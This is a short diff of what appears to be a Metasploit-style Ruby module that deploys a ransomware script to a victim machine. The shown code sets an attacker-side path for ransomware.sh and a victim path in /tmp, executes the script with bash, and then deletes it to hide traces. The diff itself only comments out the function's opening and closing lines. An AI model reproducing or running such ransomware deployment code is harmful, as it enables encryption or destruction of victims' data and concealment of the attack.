@@ -1,4 +1,4 @@
-def run_script(client)
+#def run_script(client)
 # Define the paths for the ransomware script on both attacker and victim machines
 local_ransomware_script = "/home/kali/Documents/ransomware.sh"  # Local path on attacker machine
 remote_ransomware_script = "/tmp/ransomware.sh"                # Remote path on victim machine
@@ -25,4 +25,4 @@ cmd_exec("bash #{remote_ransomware_script}")
 print_status("Cleaning up uploaded files...")
 cmd_exec("rm -f #{remote_ransomware_script}")
 print_good("Ransomware script executed and cleaned up.")
-end
+#end
